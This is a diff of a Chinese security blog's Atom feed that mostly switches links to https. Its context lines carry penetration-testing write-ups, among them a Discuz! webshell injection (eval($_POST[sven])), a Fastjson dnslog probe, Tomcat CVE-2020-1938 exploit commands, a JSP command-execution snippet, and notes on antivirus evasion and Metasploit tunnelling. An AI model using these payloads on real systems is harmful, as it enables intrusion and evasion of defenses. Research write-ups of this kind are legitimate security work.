@@ -1,19 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-    <id>http://www.svenbeast.com/</id>
+    <id>https://www.svenbeast.com</id>
     <title>斯文beast | 世界很大，你我很小</title>
-    <updated>2020-05-25T12:31:04.668Z</updated>
+    <updated>2020-05-26T06:44:53.467Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
-    <link rel="alternate" href="http://www.svenbeast.com/"/>
-    <link rel="self" href="http://www.svenbeast.com/atom.xml"/>
+    <link rel="alternate" href="https://www.svenbeast.com"/>
+    <link rel="self" href="https://www.svenbeast.com/atom.xml"/>
     <subtitle>Let&apos;s move in life.  不在平静中灭亡~  </subtitle>
-    <logo>http://www.svenbeast.com/images/avatar.png</logo>
-    <icon>http://www.svenbeast.com/favicon.ico</icon>
+    <logo>https://www.svenbeast.com/images/avatar.png</logo>
+    <icon>https://www.svenbeast.com/favicon.ico</icon>
     <rights>All rights reserved 2020, 斯文beast | 世界很大，你我很小</rights>
     <entry>
         <title type="html"><![CDATA[Discuz!x3.4 后台修改UCenter配置getshell]]></title>
-        <id>http://www.svenbeast.com/post/discuzx34-hou-tai-xiu-gai-uc_center-pei-zhi-getshell/</id>
-        <link href="http://www.svenbeast.com/post/discuzx34-hou-tai-xiu-gai-uc_center-pei-zhi-getshell/">
+        <id>https://www.svenbeast.com/post/discuzx34-hou-tai-xiu-gai-uc_center-pei-zhi-getshell/</id>
+        <link href="https://www.svenbeast.com/post/discuzx34-hou-tai-xiu-gai-uc_center-pei-zhi-getshell/">
         </link>
         <updated>2020-05-20T12:50:06.000Z</updated>
         <content type="html"><![CDATA[<h3 id="0x01-背景">0x01 背景</h3>
@@ -22,7 +22,7 @@
 最近通过朋友推荐，换了本子0.0 ，有点不适应，各种安软件安环境然后又改了博客样式，终于可以发文章拉
 对新本子的颜值和速度很满意，附图小小的秀一把
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1589983144183.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1589983144183.png" alt="" loading="lazy"></figure>
 <h3 id="0x02-主题">0x02 主题</h3>
 <ul>
 <li>环境搭建：windows+phpstudy+Discuz!x3.4</li>
@@ -34,8 +34,8 @@
 <ol>
 <li>进入后台<code>站长</code>-<code>UCenter设置</code>，修改UCenter通信密钥为123456并<code>记录下来，填入code.php</code>，修改UC_API=<code>http://192.168.0.106/discuz!x3.4/uc_server');eval($_POST[sven]);//</code>，点击保存</li>
 </ol>
-<p><img src="http://www.svenbeast.com//post-images/1589986312712.png" alt="" loading="lazy"><br>
-<img src="http://www.svenbeast.com//post-images/1589986439989.png" alt="" loading="lazy"></p>
+<p><img src="https://www.svenbeast.com/post-images/1589986312712.png" alt="" loading="lazy"><br>
+<img src="https://www.svenbeast.com/post-images/1589986439989.png" alt="" loading="lazy"></p>
 </li>
 <li>
 <ol start="2">
@@ -43,7 +43,7 @@
 </ol>
 </li>
 </ul>
-<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1589986948935.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://www.svenbeast.com/post-images/1589986948935.png" alt="" loading="lazy"></figure>
 <p><code>生成code值</code></p>
 <pre><code>&lt;?php
 $uc_key=&quot;123456&quot;;//此处填写刚才UCenter设置的值
@@ -107,7 +107,7 @@ function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
 <li>
 <ol start="3">
 <li>带code参数GET发送请求(发送这个请求前后台功能都是不正常的，发送后后台恢复正常)<br>
-<img src="http://www.svenbeast.com//post-images/1589987534699.png" alt="" loading="lazy"></li>
+<img src="https://www.svenbeast.com/post-images/1589987534699.png" alt="" loading="lazy"></li>
 </ol>
 </li>
 </ul>
@@ -134,13 +134,13 @@ Content-Length: 133
 </ol>
 </li>
 </ul>
-<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1589989434631.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://www.svenbeast.com/post-images/1589989434631.png" alt="" loading="lazy"></figure>
 ]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[搭建自己的dnslog平台并以此来发现Fastjson资产]]></title>
-        <id>http://www.svenbeast.com/post/16--phe4I/</id>
-        <link href="http://www.svenbeast.com/post/16--phe4I/">
+        <id>https://www.svenbeast.com/post/16--phe4I/</id>
+        <link href="https://www.svenbeast.com/post/16--phe4I/">
         </link>
         <updated>2020-04-11T11:44:26.000Z</updated>
         <content type="html"><![CDATA[<h3 id="0x01">0x01 ^$&amp;!#@*</h3>
@@ -159,10 +159,10 @@ Content-Length: 133
 <ul>
 <li>1.此处购买域名，任意即可，因本人强迫症，购买dnslog.cool，跟随阿里云的购买流程即可，配置邮箱，配置个人信息等</li>
 <li>2.自定义DNS Host：等待实名认证审核完成，一般10到20分钟即可，前往自定义DNS Host功能处创建2个DNS服务器，比如设置sven1.dnslog.cool,sven2.dnslog.cool，IP地址填写服务器ip:123.321.213.2<br>
-<img src="http://www.svenbeast.com//post-images/1586606506182.png" alt="" loading="lazy"></li>
+<img src="https://www.svenbeast.com/post-images/1586606506182.png" alt="" loading="lazy"></li>
 <li>3.DNS修改：前往DNS修改功能，修改dns服务器为sven1.dnslog.cool,sven2.dnslog.cool</li>
 <li>4.域名解析：然后点击左边的域名解析功能，填加2条解析记录，主机记录填写sven1，记录类型为A，解析线路为默认，记录值为123.321.213.2(我的服务器ip)，剩下默认即可，第二条解析记录的主机记录填写sven2，其他同上条<br>
-<img src="http://www.svenbeast.com//post-images/1586607388972.png" alt="" loading="lazy"></li>
+<img src="https://www.svenbeast.com/post-images/1586607388972.png" alt="" loading="lazy"></li>
 <li>5.确定域名的实名认证审核完成后，登录服务器（必须拥有独立外网ip的哦），下载xray，先使用命令行xray.exe reverse运行一遍，自动生成config.yaml，然后打开config.yaml，找到配置反连平台得配置（270行上下十来行都是），替换成如下程度，按照自己实际情况更换密码和ip和域名和dns服务器的前缀后运行xray（xray.exe reverse），运行完毕后访问链接：http://123.321.213.2:8001，就是dnslog管理平台了</li>
 </ul>
 <pre><code>reverse:
@@ -201,11 +201,11 @@ Content-Length: 133
     dns_server_ip: &quot;123.321.213.2&quot;
     remote_server: false
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1586608033853.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1586608033853.png" alt="" loading="lazy"></figure>
 <ul>
 <li>6.生成用来检测的域名：复制好后直接ping xxxxxx.dnslog.cool即可收到请求<br>
-<img src="http://www.svenbeast.com//post-images/1586608380495.png" alt="" loading="lazy"><br>
-<img src="http://www.svenbeast.com//post-images/1586608485494.png" alt="" loading="lazy"></li>
+<img src="https://www.svenbeast.com/post-images/1586608380495.png" alt="" loading="lazy"><br>
+<img src="https://www.svenbeast.com/post-images/1586608485494.png" alt="" loading="lazy"></li>
 </ul>
 <h3 id="0x04-fastjson资产检测">0x04 fastjson资产检测</h3>
 <p>利用dnslog回显检测后端是否使用fastjson</p>
@@ -213,8 +213,8 @@ Content-Length: 133
 {&quot;e&quot;:{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;hbs9jr.dnslog.cn&quot;}}
 
 </code></pre>
-<p><img src="http://www.svenbeast.com//post-images/1586609667744.png" alt="" loading="lazy"><br>
-<img src="http://www.svenbeast.com//post-images/1586609743542.png" alt="" loading="lazy"></p>
+<p><img src="https://www.svenbeast.com/post-images/1586609667744.png" alt="" loading="lazy"><br>
+<img src="https://www.svenbeast.com/post-images/1586609743542.png" alt="" loading="lazy"></p>
 <p>这样我的批量多线程检测脚本也就完成了，当然也只是一种思路，还有其他增加检测率的方法，部分代码如下</p>
 <pre><code>        try:
 
@@ -247,8 +247,8 @@ Content-Length: 133
     </entry>
     <entry>
         <title type="html"><![CDATA[Shiro反序列化利用工具ShiroScan代码重构，速度增加300%，成功率增加30%]]></title>
-        <id>http://www.svenbeast.com/post/tskRKJIPg/</id>
-        <link href="http://www.svenbeast.com/post/tskRKJIPg/">
+        <id>https://www.svenbeast.com/post/tskRKJIPg/</id>
+        <link href="https://www.svenbeast.com/post/tskRKJIPg/">
         </link>
         <updated>2020-03-29T12:59:36.000Z</updated>
         <content type="html"><![CDATA[<h3 id="0x01-背景">0x01 背景</h3>
@@ -290,13 +290,13 @@ Content-Length: 133
 </li>
 <li>
 <p>所以现在的ysoserial.jar包是新的，请勿更换成自己的jar包哦<br>
-<img src="http://www.svenbeast.com//post-images/1585488337537.png" alt="" loading="lazy"></p>
+<img src="https://www.svenbeast.com/post-images/1585488337537.png" alt="" loading="lazy"></p>
 </li>
 </ul>
 <h3 id="0x04-坑点">0x04 坑点</h3>
 <ul>
 <li>python的threadpool模块中threadpool.makeRequests这里传参不能使用超过2个参数，难住我了，最后解决办法是参数集合成1个参数，到了方法里在正则取出需要的参数-.-! （此处别笑，掌声。。）<br>
-<img src="http://www.svenbeast.com//post-images/1585490129370.png" alt="" loading="lazy"></li>
+<img src="https://www.svenbeast.com/post-images/1585490129370.png" alt="" loading="lazy"></li>
 </ul>
 <h3 id="0x05-忽略">0x05 忽略</h3>
 <ul>
@@ -309,8 +309,8 @@ Content-Length: 133
     </entry>
     <entry>
         <title type="html"><![CDATA[【无错漏优化版】批量百度权重查询工具]]></title>
-        <id>http://www.svenbeast.com/post/QjiX32_Cm/</id>
-        <link href="http://www.svenbeast.com/post/QjiX32_Cm/">
+        <id>https://www.svenbeast.com/post/QjiX32_Cm/</id>
+        <link href="https://www.svenbeast.com/post/QjiX32_Cm/">
         </link>
         <updated>2020-03-12T09:28:37.000Z</updated>
         <content type="html"><![CDATA[<h3 id="0x01-原因">0x01 原因</h3>
@@ -384,13 +384,13 @@ def process():
 <li>3.权重大于1的网址存入同目录rank_1.txt文件</li>
 </ul>
 <p>github链接：https://github.com/sv3nbeast/Baidu_Rank</p>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1584005473122.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1584005473122.png" alt="" loading="lazy"></figure>
 ]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）]]></title>
-        <id>http://www.svenbeast.com/post/fqSI9laE8/</id>
-        <link href="http://www.svenbeast.com/post/fqSI9laE8/">
+        <id>https://www.svenbeast.com/post/fqSI9laE8/</id>
+        <link href="https://www.svenbeast.com/post/fqSI9laE8/">
         </link>
         <updated>2020-02-21T07:23:52.000Z</updated>
         <content type="html"><![CDATA[<h3 id="0x01-漏洞影响">0x01 漏洞影响</h3>
@@ -410,13 +410,13 @@ def process():
 </ul>
 <pre><code>python2 &quot;Tomcat-ROOT路径下文件读取(CVE-2020-1938).py&quot; -p 8009 -f /WEB-INF/web.xml 127.0.0.1
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1582271986826.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1582271986826.png" alt="" loading="lazy"></figure>
 <ul>
 <li>文件包含</li>
 </ul>
 <pre><code>python2 &quot;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&quot; -p 8009 -f /test.txt 127.0.0.1
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1582279293250.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://www.svenbeast.com/post-images/1582279293250.png" alt="" loading="lazy"></figure>
 <ul>
 <li>test.txt</li>
 </ul>
@@ -446,7 +446,7 @@ def process():
 	out.print(&quot;&lt;/pre&gt;&quot;);
 %&gt;
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1582279374605.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://www.svenbeast.com/post-images/1582279374605.png" alt="" loading="lazy"></figure>
 <ul>
 <li>反弹shell用的命令需要进行bash编码</li>
 <li>在线bash编码：http://www.jackson-t.ca/runtime-exec-payloads.html</li>
@@ -461,8 +461,8 @@ def process():
     </entry>
     <entry>
         <title type="html"><![CDATA[为OneForAll增加一个新增域名监控插件（One_Monitor）]]></title>
-        <id>http://www.svenbeast.com/post/-y8PKMNR2/</id>
-        <link href="http://www.svenbeast.com/post/-y8PKMNR2/">
+        <id>https://www.svenbeast.com/post/-y8PKMNR2/</id>
+        <link href="https://www.svenbeast.com/post/-y8PKMNR2/">
         </link>
         <updated>2020-02-17T09:04:39.000Z</updated>
         <content type="html"><![CDATA[<h3 id="0x01-背景">0x01 背景</h3>
@@ -590,14 +590,14 @@ if __name__ == '__main__':
 <li>2.首先对想监控的域名用oneforall扫一遍，结果为txt格式</li>
 <li>3.我设置了一个域名30分钟的延迟，因为是实时漏扫，给留的时间，不需要可以删掉</li>
 <li>4.应该没啥了，代码灰常简单，有问题一看就知道的，有问题可以交流。还希望有人也能分享我一个代码简单但实用的脚本（附一个测试图，是计划任务启动的，所以是白板）<br>
-<img src="http://www.svenbeast.com//post-images/1581931856029.png" alt="" loading="lazy"></li>
+<img src="https://www.svenbeast.com/post-images/1581931856029.png" alt="" loading="lazy"></li>
 </ul>
 ]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[记录一次免杀的粗鄙操作(MSF+shellcode+某杀毒)]]></title>
-        <id>http://www.svenbeast.com/post/tSl508OMg/</id>
-        <link href="http://www.svenbeast.com/post/tSl508OMg/">
+        <id>https://www.svenbeast.com/post/tSl508OMg/</id>
+        <link href="https://www.svenbeast.com/post/tSl508OMg/">
         </link>
         <updated>2020-01-17T13:38:42.000Z</updated>
         <content type="html"><![CDATA[<h3 id="0x01-背景">0x01 背景</h3>
@@ -622,27 +622,27 @@ if __name__ == '__main__':
 <h3 id="0x03-结果">0x03 结果</h3>
 <ul>
 <li>1.虽然是老方法，不过胜在比较自由（gif加载中...）(也可以shellcode放在公网进行请求，若被杀可以对代码重新进行其他编码处理)<br>
-<img src="http://www.svenbeast.com//post-images/1579676723159.gif" alt="" loading="lazy"><br>
-<img src="http://www.svenbeast.com//post-images/1579674799568.png" alt="" loading="lazy"></li>
+<img src="https://www.svenbeast.com/post-images/1579676723159.gif" alt="" loading="lazy"><br>
+<img src="https://www.svenbeast.com/post-images/1579674799568.png" alt="" loading="lazy"></li>
 </ul>
 ]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[跨年诶，phpcms后台getshell]]></title>
-        <id>http://www.svenbeast.com/post/XzA6X7QIp/</id>
-        <link href="http://www.svenbeast.com/post/XzA6X7QIp/">
+        <id>https://www.svenbeast.com/post/XzA6X7QIp/</id>
+        <link href="https://www.svenbeast.com/post/XzA6X7QIp/">
         </link>
         <updated>2019-12-31T16:46:10.000Z</updated>
         <content type="html"><![CDATA[<ul>
 <li>细节在tools里，我就是过年不知道发啥，大晚上那就复现一下吧。。吧。（抢到个云悉邀请码，开森）<br>
-<img src="http://www.svenbeast.com//post-images/1577810790913.png" alt="" loading="lazy"></li>
+<img src="https://www.svenbeast.com/post-images/1577810790913.png" alt="" loading="lazy"></li>
 </ul>
 ]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[kali转发公网+过杀毒+配合msf入侵windows7]]></title>
-        <id>http://www.svenbeast.com/post/RD6ZQ1MX_/</id>
-        <link href="http://www.svenbeast.com/post/RD6ZQ1MX_/">
+        <id>https://www.svenbeast.com/post/RD6ZQ1MX_/</id>
+        <link href="https://www.svenbeast.com/post/RD6ZQ1MX_/">
         </link>
         <updated>2019-12-27T06:57:17.000Z</updated>
         <content type="html"><![CDATA[<h3 id="0x01-此篇为个人记录">0x01 此篇为个人记录</h3>
@@ -680,7 +680,7 @@ local_ip = 127.0.0.1
 local_port = 6666
 remote_port = 4446
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1577431332788.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1577431332788.png" alt="" loading="lazy"></figure>
 <pre><code>* 命令按顺序排序：
 
 ./frps -c frps.ini &gt; log.txt &amp;                  //公网windows开启frp
@@ -691,26 +691,26 @@ remote_port = 4446
 <h3 id="0x03-shellter生成后门">0x03 shellter生成后门</h3>
 <ul>
 <li>尝试过多种方法，最后发现这个比较香（目标机器为*60时，可用）<br>
-<img src="http://www.svenbeast.com//post-images/1577434809015.gif" alt="" loading="lazy"></li>
+<img src="https://www.svenbeast.com/post-images/1577434809015.gif" alt="" loading="lazy"></li>
 </ul>
 <h3 id="0x04-在win7的60套餐中获得meterpreter">0x04 在Win7的*60套餐中获得meterpreter</h3>
 <ul>
 <li>下次联动cs，作为web狗得慢慢来 -.-!<br>
-<img src="http://www.svenbeast.com//post-images/1577435547116.gif" alt="" loading="lazy"></li>
+<img src="https://www.svenbeast.com/post-images/1577435547116.gif" alt="" loading="lazy"></li>
 </ul>
 ]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[java RMI反序列化无含量记录]]></title>
-        <id>http://www.svenbeast.com/post/TWAepnjZi/</id>
-        <link href="http://www.svenbeast.com/post/TWAepnjZi/">
+        <id>https://www.svenbeast.com/post/TWAepnjZi/</id>
+        <link href="https://www.svenbeast.com/post/TWAepnjZi/">
         </link>
         <updated>2019-12-27T01:40:10.000Z</updated>
         <content type="html"><![CDATA[<ul>
 <li>识别端口类型为java RMI时，尝试利用此漏洞</li>
 <li>参考链接：https://www.freebuf.com/vuls/126499.html</li>
 </ul>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1577412256632.gif" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1577412256632.gif" alt="" loading="lazy"></figure>
 ]]></content>
     </entry>
 </feed>
